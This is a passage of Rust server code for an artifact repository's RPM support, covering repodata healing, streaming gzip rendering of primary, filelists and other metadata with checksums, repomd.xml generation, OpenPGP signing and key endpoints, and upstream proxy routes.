/// [`RPM_HEAL_MAX_TRANSIENT_FAILURES`] in a row the package is settled with
/// a marker that is retried after [`RPM_HEAL_RETRY_SECS`], so one unreadable
/// object cannot keep its repository (and every virtual repository over
/// it) re-rendering. Returns whether the package is now settled.
async fn record_transient_heal_failure(db: &sqlx::PgPool, artifact_id: uuid::Uuid) -> bool {
    let failures: Result<i64, sqlx::Error> = sqlx::query_scalar(
        "INSERT INTO artifact_metadata (artifact_id, format, metadata) \
         VALUES ($1, 'rpm', jsonb_build_object($2::text, 1)) \
         ON CONFLICT (artifact_id) DO UPDATE SET metadata = CASE \
             WHEN jsonb_typeof(artifact_metadata.metadata) = 'object' \
             THEN artifact_metadata.metadata || jsonb_build_object($2::text, \
                  COALESCE((artifact_metadata.metadata ->> $2::text)::bigint, 0) + 1) \
             ELSE jsonb_build_object($2::text, 1) END \
         RETURNING (metadata ->> $2::text)::bigint",
    )
    .bind(artifact_id)
    .bind(RPM_HEAL_FAILURES_KEY)
    .fetch_one(db)
    .await;
    let Ok(failures) = failures else {
        return false;
    };
    if failures < RPM_HEAL_MAX_TRANSIENT_FAILURES {
        return false;
    }
    metrics::counter!("ak_rpm_repodata_heal_retry_markers_total").increment(1);
    warn!(
        artifact_id = %artifact_id,
        failures,
        "RPM repodata heal: package unreadable, retried in {RPM_HEAL_RETRY_SECS}s"
    );
    let mut marker = unparseable_block(&format!(
        "stored package unreadable after {failures} attempts"
    ));
    marker["retry_after"] = serde_json::json!(chrono::Utc::now().timestamp() + RPM_HEAL_RETRY_SECS);
    let metadata = serde_json::json!({ RPM_REPODATA_KEY: marker });
    persist_repodata_block(db, artifact_id, &metadata)
        .await
        .is_ok()
}

/// Record an RPM artifact's metadata at upload. The artifact row already
/// exists, so a write the database refuses is not silently dropped (#3801):
/// a value too large to store is recorded with an "unparseable" repodata
/// marker instead, so the heal does not re-derive it on every render.
pub(crate) async fn record_rpm_metadata(
    db: &sqlx::PgPool,
    artifact_id: uuid::Uuid,
    repo_id: uuid::Uuid,
    metadata: &serde_json::Value,
) -> Result<(), sqlx::Error> {
    let write = |value: serde_json::Value| async move {
        sqlx::query(
            "INSERT INTO artifact_metadata (artifact_id, format, metadata) \
             VALUES ($1, 'rpm', $2) \
             ON CONFLICT (artifact_id) DO UPDATE SET metadata = $2",
        )
        .bind(artifact_id)
        .bind(&value)
        .execute(db)
        .await
        .map(|_| ())
    };
    let result = match write(metadata.clone()).await {
        Err(e) if is_size_limit_error(&e) => {
            let mut smaller = metadata.clone();
            smaller[RPM_REPODATA_KEY] =
                unparseable_block(&format!("repodata block too large to store: {e}"));
            write(smaller).await
        }
        other => other,
    };
    let _ = sqlx::query("UPDATE repositories SET updated_at = NOW() WHERE id = $1")
        .bind(repo_id)
        .execute(db)
        .await;
    result
}

/// Why a stored package's header could not be read back.
#[derive(Debug)]
enum HeaderRead {
    /// Retrying cannot help (corrupt size, a header that keeps growing):
    /// record the package as unparseable.
    Permanent(String),
    /// Storage unavailable, erroring, or the object missing (a mount blip or
    /// a storage migration looks exactly like that): retry on a later
    /// render, up to [`RPM_HEAL_MAX_TRANSIENT_FAILURES`] times in a row.
    Transient(String),
}

/// Read just enough of a stored package to cover its lead, signature header
/// and main header, growing the ranged read as the header sizes are learned.
async fn read_rpm_header_prefix(
    state: &SharedState,
    location: &crate::storage::StorageLocation,
    key: &str,
    size_bytes: i64,
) -> Result<Bytes, HeaderRead> {
    let storage = state
        .storage_for_repo(location)
        .map_err(|e| HeaderRead::Transient(e.to_string()))?;
    read_rpm_header_prefix_from(storage.as_ref(), key, size_bytes).await
}

/// [`read_rpm_header_prefix`] against an already-resolved backend. A header
/// that would need more than the stored size or [`RPM_HEAL_HEADER_LIMIT`]
/// stops the growth; the short prefix is returned and fails to parse.
async fn read_rpm_header_prefix_from(
    storage: &dyn crate::storage::StorageBackend,
    key: &str,
    size_bytes: i64,
) -> Result<Bytes, HeaderRead> {
    let size = usize::try_from(size_bytes)
        .map_err(|_| HeaderRead::Permanent("negative recorded package size".into()))?;
    let mut want = size.min(64 * 1024);
    for _ in 0..4 {
        let bytes = storage
            .get_range(key, 0, want)
            .await
            .map_err(|e| HeaderRead::Transient(e.to_string()))?;
        match RpmHandler::header_bytes_needed(&bytes) {
            Some(needed)
                if needed > bytes.len()
                    && needed > want
                    && needed <= size
                    && needed <= RPM_HEAL_HEADER_LIMIT =>
            {
                want = needed;
            }
            _ => return Ok(bytes),
        }
    }
    Err(HeaderRead::Permanent(
        "RPM header size did not converge".into(),
    ))
}

// ---------------------------------------------------------------------------
// Shared repodata rendering
// ---------------------------------------------------------------------------

/// Render the complete repodata set for one repository state: `repomd.xml`
/// plus every compressed index document its checksums describe. Rendering
/// them together (instead of per endpoint, per request) is what lets the
/// cache serve coherent, immutable bytes for the whole set (#2521) — and the
/// gzipped siblings are byproducts `repomd.xml` had to build anyway.
#[cfg(test)]
fn render_repodata(artifacts: &[RpmArtifact]) -> RenderedRepodata {
    render_repodata_at(artifacts, "")
}

fn render_repodata_at(artifacts: &[RpmArtifact], prefix: &str) -> RenderedRepodata {
    let mut writer = RepodataWriter::new(artifacts.len(), prefix);
    writer.push_batch(artifacts);
    writer.finish()
}

/// Uncompressed bytes a document buffers before it starts compressing
/// (#4544). A document that stays under this is gzipped in one call, exactly
/// as the whole-catalogue render did, so typical repositories keep
/// byte-identical compressed files across the upgrade (and across replicas
/// of mixed versions during a rolling one). Past it the buffer is handed to
/// the encoder and later writes stream through: the zlib-rs backend's output
/// depends on how its input is split, so a document that large gets new
/// (still deterministic) compressed bytes, which only the repositories that
/// could not render before reach.
pub(crate) const RPM_REPODATA_DOC_SPILL_BYTES: usize = 32 * 1024 * 1024;

/// A [`Write`] that forwards to `inner` and keeps the SHA-256 and length of
/// everything written, so a compressed document's `repomd.xml` checksum and
/// size are known without holding the document (#4544).
pub(crate) struct DigestSink<W> {
    inner: W,
    sha256: Sha256,
    len: usize,
}

impl<W: Write> DigestSink<W> {
    fn new(inner: W) -> Self {
        Self {
            inner,
            sha256: Sha256::new(),
            len: 0,
        }
    }
}

impl<W: Write> Write for DigestSink<W> {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        let n = self.inner.write(buf)?;
        self.sha256.update(&buf[..n]);
        self.len += n;
        Ok(n)
    }

    fn flush(&mut self) -> std::io::Result<()> {
        self.inner.flush()
    }
}

/// One compressed index document being written: the uncompressed bytes
/// buffered so far (up to [`RPM_REPODATA_DOC_SPILL_BYTES`]) or the gzip
/// stream they spilled into, plus the running checksum and size of the
/// uncompressed (open) bytes. A render therefore never materialises a large
/// uncompressed document (#4544).
///
/// The compressed bytes go to `W`: a `Vec<u8>` for the on-request render, a
/// spool file for the precomputed builder. The gzip output depends only on
/// how the input is split, never on the sink, so both produce the same bytes.
/// The first write error is kept and returned by [`XmlDocStream::finish`].
struct XmlDocStream<W: Write> {
    pending: Vec<u8>,
    sink: Option<W>,
    gz: Option<GzEncoder<DigestSink<W>>>,
    open_sha256: Sha256,
    open_size: usize,
    spill_bytes: usize,
    error: Option<std::io::Error>,
}

/// A finished [`XmlDocStream`]: the sink holding the gzipped bytes and the
/// four values `repomd.xml` advertises for them.
pub(crate) struct FinishedDoc<W> {
    pub(crate) sink: W,
    pub(crate) size: usize,
    sha256: String,
    open_sha256: String,
    open_size: usize,
}

impl<W: Write> XmlDocStream<W> {
    fn new(sink: W, spill_bytes: usize) -> Self {
        Self {
            pending: Vec::new(),
            sink: Some(sink),
            gz: None,
            open_sha256: Sha256::new(),
            open_size: 0,
            spill_bytes,
            error: None,
        }
    }

    fn write(&mut self, xml: &str) {
        if self.error.is_some() {
            return;
        }
        self.open_sha256.update(xml.as_bytes());
        self.open_size += xml.len();
        let result = match self.gz.as_mut() {
            Some(gz) => gz.write_all(xml.as_bytes()),
            None => {
                self.pending.extend_from_slice(xml.as_bytes());
                if self.pending.len() > self.spill_bytes {
                    let sink = self.sink.take().expect("sink present before the spill");
                    let mut gz = GzEncoder::new(DigestSink::new(sink), Compression::default());
                    let result = gz.write_all(&self.pending);
                    self.pending = Vec::new();
                    self.gz = Some(gz);
                    result
                } else {
                    Ok(())
                }
            }
        };
        if let Err(e) = result {
            self.error = Some(e);
        }
    }

    fn finish(self) -> std::io::Result<FinishedDoc<W>> {
        if let Some(e) = self.error {
            return Err(e);
        }
        let digest = match self.gz {
            Some(gz) => gz.finish()?,
            None => {
                // One call, exactly as `gzip_bytes` compresses.
                let sink = self.sink.expect("sink present without a spill");
                let mut gz = GzEncoder::new(DigestSink::new(sink), Compression::default());
                gz.write_all(&self.pending)?;
                gz.finish()?
            }
        };
        Ok(FinishedDoc {
            size: digest.len,
            sha256: format!("{:x}", digest.sha256.finalize()),
            open_sha256: format!("{:x}", self.open_sha256.finalize()),
            open_size: self.open_size,
            sink: digest.inner,
        })
    }
}

/// The documents of one finished render: `repomd.xml` and the sinks holding
/// the compressed primary, filelists and other documents it describes.
pub(crate) struct RepodataDocs<W> {
    pub(crate) repomd_xml: String,
    pub(crate) primary: FinishedDoc<W>,
    pub(crate) filelists: FinishedDoc<W>,
    pub(crate) other: FinishedDoc<W>,
}

/// Incremental writer for one repodata set (#4544). The package count is
/// fixed up front (it is the `packages=` attribute of each document's
/// opening element); packages are then appended in batches, each document
/// gzipped and hashed as it grows, and [`RepodataWriter::finish`] closes the
/// documents and builds the `repomd.xml` that describes them. Every package
/// is one write to each document whatever the batching, so the output is a
/// pure function of the rows (#2636); the uncompressed documents are exactly
/// what the whole-slice generators build, and a document under
/// [`RPM_REPODATA_DOC_SPILL_BYTES`] compresses to exactly the same bytes.
pub(crate) struct RepodataWriter<W: Write = Vec<u8>> {
    prefix: String,
    primary: XmlDocStream<W>,
    filelists: XmlDocStream<W>,
    other: XmlDocStream<W>,
    /// Most recent `updated_at` seen: the metadata epoch (#2636).
    latest_update: Option<chrono::DateTime<chrono::Utc>>,
    /// Scratch buffer reused for each package's elements.
    scratch: String,
}

impl RepodataWriter<Vec<u8>> {
    fn new(packages: usize, prefix: &str) -> Self {
        Self::with_spill(packages, prefix, RPM_REPODATA_DOC_SPILL_BYTES)
    }

    fn with_spill(packages: usize, prefix: &str, spill_bytes: usize) -> Self {
        Self::with_sinks(
            packages,
            prefix,
            spill_bytes,
            [Vec::new(), Vec::new(), Vec::new()],
        )
    }

    fn finish(self) -> RenderedRepodata {
        let docs = self.finish_docs().expect("in-memory repodata write failed");
        RenderedRepodata {
            repomd_xml: Bytes::from(docs.repomd_xml),
            primary_gz: Bytes::from(docs.primary.sink),
            filelists_gz: Bytes::from(docs.filelists.sink),
            other_gz: Bytes::from(docs.other.sink),
            cacheable: true,
            valid_until: None,
        }
    }
}

impl<W: Write> RepodataWriter<W> {
    /// A writer whose primary, filelists and other documents (in that order)
    /// are compressed into `sinks`.
    pub(crate) fn with_sinks(
        packages: usize,
        prefix: &str,
        spill_bytes: usize,
        [primary, filelists, other]: [W; 3],
    ) -> Self {
        let mut writer = Self {
            prefix: prefix.to_string(),
            primary: XmlDocStream::new(primary, spill_bytes),
            filelists: XmlDocStream::new(filelists, spill_bytes),
            other: XmlDocStream::new(other, spill_bytes),
            latest_update: None,
            scratch: String::new(),
        };
        writer.primary.write(&primary_xml_header(packages));
        writer.filelists.write(&filelists_xml_header(packages));
        writer.other.write(&other_xml_header(packages));
        writer
    }

    /// Append `artifacts` (already in the render order) to all three
    /// documents. The stored repodata blocks are deserialized once per
    /// batch and shared by the three generators.
    pub(crate) fn push_batch(&mut self, artifacts: &[RpmArtifact]) {
        let infos = repodata_infos(artifacts);
        for (artifact, info) in artifacts.iter().zip(&infos) {
            self.scratch.clear();
            push_primary_package(&mut self.scratch, artifact, info, &self.prefix);
            self.primary.write(&self.scratch);
            self.scratch.clear();
            push_filelists_package(&mut self.scratch, artifact, info);
            self.filelists.write(&self.scratch);
            self.scratch.clear();
            push_other_package(&mut self.scratch, artifact, info);
            self.other.write(&self.scratch);
        }
        self.latest_update =
            metadata_epoch_max(self.latest_update, artifacts.iter().map(|a| a.updated_at));
    }

    pub(crate) fn finish_docs(mut self) -> std::io::Result<RepodataDocs<W>> {
        self.primary.write("</metadata>\n");
        self.filelists.write("</filelists>\n");
        self.other.write("</otherdata>\n");
        let primary = self.primary.finish()?;
        let filelists = self.filelists.finish()?;
        let other = self.other.finish()?;

        let updateinfo = updateinfo_document();

        // #2636: the metadata epoch is derived from repository *state*, never
        // from the clock. `repomd.xml` and `repomd.xml.asc` render this
        // document independently, one request apart, and the client verifies
        // the signature from the second render against the bytes of the
        // first. See the `metadata_epoch` module docs.
        let timestamp = metadata_epoch(self.latest_update).timestamp();
        let repomd_xml = repomd_document(timestamp, [&primary, &filelists, &other], &updateinfo);
        Ok(RepodataDocs {
            repomd_xml,
            primary,
            filelists,
            other,
        })
    }
}

/// `updateinfo.xml.gz` (an empty advisory list) and the values `repomd.xml`
/// advertises for it. Constant, so it is rendered per request and never
/// stored.
struct UpdateinfoDoc {
    gz: Vec<u8>,
    sha256: String,
    open_sha256: String,
    open_size: usize,
}

fn updateinfo_document() -> UpdateinfoDoc {
    let xml = generate_updateinfo_xml();
    let gz = gzip_bytes(xml.as_bytes());
    UpdateinfoDoc {
        sha256: sha256_hex(&gz),
        open_sha256: sha256_hex(xml.as_bytes()),
        open_size: xml.len(),
        gz,
    }
}

/// `repomd.xml` for one rendered set: the checksums and sizes of the
/// primary, filelists and other documents (in that order) and of
/// `updateinfo.xml.gz`.
fn repomd_document<W>(
    timestamp: i64,
    [primary, filelists, other]: [&FinishedDoc<W>; 3],
    updateinfo: &UpdateinfoDoc,
) -> String {
    let (updateinfo_sha256, updateinfo_open_sha256, updateinfo_open_size) = (
        &updateinfo.sha256,
        &updateinfo.open_sha256,
        updateinfo.open_size,
    );
    let (primary_sha256, primary_open_sha256, primary_open_size) =
        (&primary.sha256, &primary.open_sha256, primary.open_size);
    let (filelists_sha256, filelists_open_sha256, filelists_open_size) = (
        &filelists.sha256,
        &filelists.open_sha256,
        filelists.open_size,
    );
    let (other_sha256, other_open_sha256, other_open_size) =
        (&other.sha256, &other.open_sha256, other.open_size);
    let repomd_xml = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<repomd xmlns="http://linux.duke.edu/metadata/repo" xmlns:rpm="http://linux.duke.edu/metadata/rpm">
  <revision>{timestamp}</revision>
  <data type="primary">
    <location href="repodata/primary.xml.gz"/>
    <checksum type="sha256">{primary_sha256}</checksum>
    <open-checksum type="sha256">{primary_open_sha256}</open-checksum>
    <timestamp>{timestamp}</timestamp>
    <size>{primary_size}</size>
    <open-size>{primary_open_size}</open-size>
  </data>
  <data type="filelists">
    <location href="repodata/filelists.xml.gz"/>
    <checksum type="sha256">{filelists_sha256}</checksum>
    <open-checksum type="sha256">{filelists_open_sha256}</open-checksum>
    <timestamp>{timestamp}</timestamp>
    <size>{filelists_size}</size>
    <open-size>{filelists_open_size}</open-size>
  </data>
  <data type="other">
    <location href="repodata/other.xml.gz"/>
    <checksum type="sha256">{other_sha256}</checksum>
    <open-checksum type="sha256">{other_open_sha256}</open-checksum>
    <timestamp>{timestamp}</timestamp>
    <size>{other_size}</size>
    <open-size>{other_open_size}</open-size>
  </data>
  <data type="updateinfo">
    <location href="repodata/updateinfo.xml.gz"/>
    <checksum type="sha256">{updateinfo_sha256}</checksum>
    <open-checksum type="sha256">{updateinfo_open_sha256}</open-checksum>
    <timestamp>{timestamp}</timestamp>
    <size>{updateinfo_size}</size>
    <open-size>{updateinfo_open_size}</open-size>
  </data>
</repomd>
"#,
        primary_sha256 = primary_sha256,
        primary_open_sha256 = primary_open_sha256,
        filelists_sha256 = filelists_sha256,
        filelists_open_sha256 = filelists_open_sha256,
        other_sha256 = other_sha256,
        other_open_sha256 = other_open_sha256,
        updateinfo_sha256 = updateinfo_sha256,
        updateinfo_open_sha256 = updateinfo_open_sha256,
        timestamp = timestamp,
        primary_size = primary.size,
        primary_open_size = primary_open_size,
        filelists_size = filelists.size,
        filelists_open_size = filelists_open_size,
        other_size = other.size,
        other_open_size = other_open_size,
        updateinfo_size = updateinfo.gz.len(),
        updateinfo_open_size = updateinfo_open_size,
    );

    repomd_xml
}

/// The later of `current` and the newest of `more`.
fn metadata_epoch_max(
    current: Option<chrono::DateTime<chrono::Utc>>,
    more: impl Iterator<Item = chrono::DateTime<chrono::Utc>>,
) -> Option<chrono::DateTime<chrono::Utc>> {
    current.into_iter().chain(more).max()
}

/// Test-facing shim retaining the original `repomd.xml`-only signature; the
/// handlers serve [`render_repodata`] output through the cache.
#[cfg(test)]
fn generate_repomd_xml_content(artifacts: &[RpmArtifact]) -> String {
    String::from_utf8(render_repodata(artifacts).repomd_xml.to_vec())
        .expect("repomd.xml is valid UTF-8")
}

// ---------------------------------------------------------------------------
// GET /rpm/{repo_key}/repodata/repomd.xml
// ---------------------------------------------------------------------------

async fn repomd_xml(
    State(state): State<SharedState>,
    auth: Option<&AuthExtension>,
    Path(repo_key): Path<String>,
) -> Result<Response, Response> {
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;

    // #2358: if this repo has an active curated publication, serve its frozen,
    // signed repomd.xml instead of live-generating / proxying.
    if let Some(resp) = try_serve_active_publication(&state, &repo, "repodata/repomd.xml").await? {
        return Ok(resp);
    }

    // #1447: for Remote repos proxy the upstream repomd.xml instead of
    // synthesizing an empty index from local artifacts.
    if let Some(resp) =
        try_proxy_repodata(&state, &repo, "repodata/repomd.xml", "application/xml").await?
    {
        return Ok(resp);
    }

    repodata_document(&state, auth, &repo, "", "repomd.xml").await
}

// ---------------------------------------------------------------------------
// GET /rpm/{repo_key}/repodata/repomd.xml.asc — Detached PGP signature
// ---------------------------------------------------------------------------

async fn repomd_xml_asc(
    State(state): State<SharedState>,
    auth: Option<&AuthExtension>,
    Path(repo_key): Path<String>,
) -> Result<Response, Response> {
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;

    // #2358: an active publication's detached signature is the one that matches
    // its frozen repomd.xml — serve the stored .asc, not a freshly-signed one.
    if let Some(resp) =
        try_serve_active_publication(&state, &repo, "repodata/repomd.xml.asc").await?
    {
        return Ok(resp);
    }

    // #1447: proxy the upstream detached signature for Remote repos.
    if let Some(resp) = try_proxy_repodata(
        &state,
        &repo,
        "repodata/repomd.xml.asc",
        "application/pgp-signature",
    )
    .await?
    {
        return Ok(resp);
    }

    // Sign the same bytes `repomd.xml` serves: the signature and the
    // document are two requests, and both must render identically from
    // unchanged state (#2636). The shared cache entry (or the stored
    // revision, #4544) makes that literal: one byte sequence, two endpoints.
    repodata_document(&state, auth, &repo, "", "repomd.xml.asc").await
}

async fn sign_repomd(
    state: &SharedState,
    repo: &RepoInfo,
    repomd_content: Bytes,
) -> Result<Response, Response> {
    let signing_svc = SigningService::new(state.db.clone(), &state.config.jwt_secret)
        .with_signature_expiry(state.config.signature_expiry_seconds);
    // #2636: this endpoint must emit a real detached OpenPGP signature — the
    // same thing Debian's Release.gpg serves — because that is the only form
    // `dnf` (repo_gpgcheck=1) and `rpm --import` can verify. It previously
    // signed via `SigningService::sign_data()`, which returns raw PKCS#1 v1.5
    // bytes, and hand-wrapped them in "BEGIN PGP SIGNATURE" markers: no packet
    // framing and no CRC24 armor checksum, so every real client rejected it.
    let key = require_signing_key(signing_svc.get_active_key_for_repo(repo.id).await)?;
    // An X.509 (`key_type=rsa`) key can never sign OpenPGP, so refuse before
    // attempting it: 409 + WARN, not 500 + ERROR. This route is anonymous, so
    // every `dnf` poll of a misconfigured repo lands here; a 500 would let an
    // unauthenticated client drive unbounded ERROR logs and 500-rate alerts for
    // what is an operator config mistake, not a server fault.
    let key = require_openpgp_capable_key(key).inspect_err(|_resp| {
        warn!(
            repo_id = %repo.id,
            "repomd.xml.asc requested but the repository's active signing key cannot \
             produce an OpenPGP signature (requires key_type='gpg')",
        );
    })?;
    // #1329: during a rotation overlap window the predecessor co-signs, so
    // clients that only trust the old key keep verifying.
    let signers = openpgp_signers_or_500(&signing_svc, key).await?;
    let key = &signers[0];
    let armored = signing_svc
        .sign_openpgp_detached_with_keys(&signers, &repomd_content)
        .await
        .map_err(|e| {
            // A key that cannot sign is a server-side failure, not a missing
            // configuration, so it must stay a loud 500: the previous
            // `.unwrap_or(None)` collapsed this into a 404 "No signing key
            // configured" while repomd.xml.key was serving that very key.
            // The signing error itself goes to the log only — this route is
            // anonymous on a public repository (#3718).
            error!(
                repo_id = %repo.id,
                key_id = %key.id,
                error = %e,
                "failed to sign repomd.xml with the repository's active signing key",
            );
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "Failed to sign repomd.xml",
            )
                .into_response()
        })?;
    // Best-effort `last_used_at` stamp; the signature already succeeded, so an
    // audit-update error must not fail the request.
    let _ = signing_svc.mark_key_used(key.id).await;

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, "application/pgp-signature")
        .header(CONTENT_LENGTH, armored.len().to_string())
        .body(Body::from(armored))
        .unwrap())
}

// ---------------------------------------------------------------------------
// GET /rpm/{repo_key}/repodata/repomd.xml.key — Public key for rpm --import
// ---------------------------------------------------------------------------

async fn repomd_xml_key(
    State(state): State<SharedState>,
    Path(repo_key): Path<String>,
) -> Result<Response, Response> {
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;

    // #2358: serve the active publication's frozen public key so a later signing
    // key rotation never invalidates an already-published @N.
    if let Some(resp) =
        try_serve_active_publication(&state, &repo, "repodata/repomd.xml.key").await?
    {
        return Ok(resp);
    }

    public_key(&state, &repo).await
}

async fn public_key(state: &SharedState, repo: &RepoInfo) -> Result<Response, Response> {
    let signing_svc = SigningService::new(state.db.clone(), &state.config.jwt_secret);
    // #2636: `dnf`'s `gpgkey=` and `rpm --import` both require an OpenPGP
    // public key. The active key's stored `public_key_pem` is that armored
    // OpenPGP block for `key_type=gpg` keys — the same material Debian's
    // gpg-key.asc serves. A lookup error is surfaced rather than swallowed, so
    // "cannot load the key" is never reported as "no key configured".
    let key = require_signing_key(signing_svc.get_active_key_for_repo(repo.id).await)?;
    // For any other key type `public_key_pem` is an X.509 SPKI PEM: not
    // importable by `rpm --import`, and useless to `dnf gpgkey=` even if it
    // were served honestly as `application/x-pem-file`, because the matching
    // `.asc` can never exist. Refusing here keeps the repo from advertising a
    // key it cannot sign with, and means the `application/pgp-keys` below is
    // always the truth rather than a claim about the bytes.
    let key = require_openpgp_capable_key(key).inspect_err(|_resp| {
        warn!(
            repo_id = %repo.id,
            "repomd.xml.key requested but the repository's active signing key is not an \
             OpenPGP key (requires key_type='gpg')",
        );
    })?;

    // #1329: serve the predecessor too while it co-signs repomd.xml.asc.
    let signers = openpgp_signers_or_500(&signing_svc, key).await?;
    let keyring = openpgp_public_keyring(&signers).map_err(|e| {
        error!(repo_id = %repo.id, error = %e, "failed to build the repository's public keyring");
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Failed to build repository public key",
        )
            .into_response()
    })?;

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, "application/pgp-keys")
        .header(CONTENT_LENGTH, keyring.len().to_string())
        .body(Body::from(keyring))
        .unwrap())
}

/// The active key plus any rotation predecessor still in its overlap window
/// (#1329). A lookup failure is a 500 with the detail logged only: these
/// routes are anonymous on a public repository (#3718).
async fn openpgp_signers_or_500(
    signing_svc: &SigningService,
    key: SigningKey,
) -> Result<Vec<SigningKey>, Response> {
    let key_id = key.id;
    signing_svc.openpgp_signers(key).await.map_err(|e| {
        error!(key_id = %key_id, error = %e, "failed to resolve rotation-overlap signing keys");
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Failed to resolve signing keys",
        )
            .into_response()
    })
}

// ---------------------------------------------------------------------------
// GET /rpm/{repo_key}/repodata/updateinfo.xml.gz — Update advisories (stub)
// ---------------------------------------------------------------------------

async fn updateinfo_xml_gz(
    State(state): State<SharedState>,
    Path(repo_key): Path<String>,
) -> Result<Response, Response> {
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;

    if let Some(resp) = try_proxy_repodata(
        &state,
        &repo,
        "repodata/updateinfo.xml.gz",
        "application/gzip",
    )
    .await?
    {
        return Ok(resp);
    }

    let updateinfo_xml = generate_updateinfo_xml();
    let gz = gzip_bytes(updateinfo_xml.as_bytes());

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, "application/gzip")
        .header(CONTENT_LENGTH, gz.len().to_string())
        .body(Body::from(gz))
        .unwrap())
}

// ---------------------------------------------------------------------------
// GET /rpm/{repo_key}/repodata/primary.xml.gz
// ---------------------------------------------------------------------------

async fn primary_xml_gz(
    State(state): State<SharedState>,
    auth: Option<&AuthExtension>,
    Path(repo_key): Path<String>,
) -> Result<Response, Response> {
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;

    if let Some(resp) =
        try_serve_active_publication(&state, &repo, "repodata/primary.xml.gz").await?
    {
        return Ok(resp);
    }

    if let Some(resp) =
        try_proxy_repodata(&state, &repo, "repodata/primary.xml.gz", "application/gzip").await?
    {
        return Ok(resp);
    }

    repodata_document(&state, auth, &repo, "", "primary.xml.gz").await
}

// ---------------------------------------------------------------------------
// GET /rpm/{repo_key}/repodata/filelists.xml.gz
// ---------------------------------------------------------------------------

async fn filelists_xml_gz(
    State(state): State<SharedState>,
    auth: Option<&AuthExtension>,
    Path(repo_key): Path<String>,
) -> Result<Response, Response> {
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;

    if let Some(resp) =
        try_serve_active_publication(&state, &repo, "repodata/filelists.xml.gz").await?
    {
        return Ok(resp);
    }

    if let Some(resp) = try_proxy_repodata(
        &state,
        &repo,
        "repodata/filelists.xml.gz",
        "application/gzip",
    )
    .await?
    {
        return Ok(resp);
    }

    repodata_document(&state, auth, &repo, "", "filelists.xml.gz").await
}

// ---------------------------------------------------------------------------
// GET /rpm/{repo_key}/repodata/other.xml.gz
// ---------------------------------------------------------------------------

async fn other_xml_gz(
    State(state): State<SharedState>,
    auth: Option<&AuthExtension>,
    Path(repo_key): Path<String>,
) -> Result<Response, Response> {
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;

    if let Some(resp) = try_serve_active_publication(&state, &repo, "repodata/other.xml.gz").await?
    {
        return Ok(resp);
    }

    if let Some(resp) =
        try_proxy_repodata(&state, &repo, "repodata/other.xml.gz", "application/gzip").await?
    {
        return Ok(resp);
    }

    repodata_document(&state, auth, &repo, "", "other.xml.gz").await
}

// ---------------------------------------------------------------------------
// GET /rpm/{repo_key}/repodata/*path — Catch-all for hash-prefixed
// repodata files. Upstream RPM repositories typically reference their
// real metadata payloads via checksum-prefixed names listed inside
// repomd.xml (e.g. `repodata/abc123...-primary.xml.gz`). When the
// repository is Remote we proxy those paths verbatim; for Hosted
// repos there is no such file so we 404.
// ---------------------------------------------------------------------------

async fn repodata_proxy(
    State(state): State<SharedState>,
    Path((repo_key, path)): Path<(String, String)>,
) -> Result<Response, Response> {
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;

    // #2358: an active publication serves its frozen repodata blobs (dnf also
    // fetches the checksum-prefixed payloads through this catch-all). Route the
    // catch-all subpath through the same traversal guard `upstream_proxy` uses
    // before it is joined onto a storage prefix, so this path can never
    // `storage.get` outside the publication prefix. On a reject we skip the
    // frozen-blob serve and fall through to the unchanged proxy path.
    let active_sub = format!("repodata/{}", path);
    if let Ok(safe_sub) = sanitize_publication_subpath(&active_sub) {
        if let Some(resp) = try_serve_active_publication(&state, &repo, &safe_sub).await? {
            return Ok(resp);
        }
    }

    let upstream_path = format!("repodata/{}", path);
    let default_ct = if path.ends_with(".gz") {
        "application/gzip"
    } else if path.ends_with(".xml") {
        "application/xml"
    } else if path.ends_with(".asc") {
        "application/pgp-signature"
    } else {
        "application/octet-stream"
    };

    if let Some(resp) = try_proxy_repodata(&state, &repo, &upstream_path, default_ct).await? {
        return Ok(resp);
    }

    Err((StatusCode::NOT_FOUND, "Not found").into_response())
}

// ---------------------------------------------------------------------------
// GET /rpm/{repo_key}/*upstream_path — Proxy fallback for upstream
// package locations that do not live under /packages/. Many real-world
// yum/dnf repositories host RPMs at the repository root or under
// vendor-specific subpaths (Packages/, pool/, el/6/x86_64/...).
//
// Depth-zero hosted repos 404 here; depth-enabled hosted repos use exact
// paths and scoped metadata. Remote repos try the local cache by
// filename first, then fall back to streaming the upstream object.
// Virtual repos resolve the path through their members in priority
// order (#3573).
// ---------------------------------------------------------------------------

async fn upstream_proxy(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((repo_key, upstream_path)): Path<(String, String)>,
    ctx: crate::api::middleware::download_telemetry::DownloadContext,
) -> Result<Response, Response> {
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;
    // #4365 item 3, as on the `/packages/` route.
    proxy_helpers::reject_ambiguous_client_segments(
        repo.repo_type == RepositoryType::Remote || repo.repo_type == RepositoryType::Virtual,
        &[&upstream_path],
    )?;
    let depth = rpm_layout::depth(&state.db, repo.id)
        .await
        .map_err(IntoResponse::into_response)?;
    if depth > 0 {
        return depth_response(&state, auth.as_ref(), &repo, &upstream_path, depth, &ctx).await;
    }

    // #2358: a leading `@<digits>` segment selects a published, immutable
    // snapshot. Serve the frozen, AK-signed metadata blob for the sub-path from
    // storage; a `packages/{nevra}.rpm` sub-path is served CHECKSUM-VERIFIED
    // from the curation-config upstream. Nothing else is resolvable under an
    // immutable `@N`, and upstream is NEVER proxied verbatim from here.
    if let Some((version_number, sub)) = split_publication_prefix(&upstream_path) {
        let prefix = fetch_published_version_prefix(&state.db, repo.id, version_number)
            .await?
            .ok_or_else(|| (StatusCode::NOT_FOUND, "Not found").into_response())?;
        let sub_path = sanitize_publication_subpath(&sub)?;

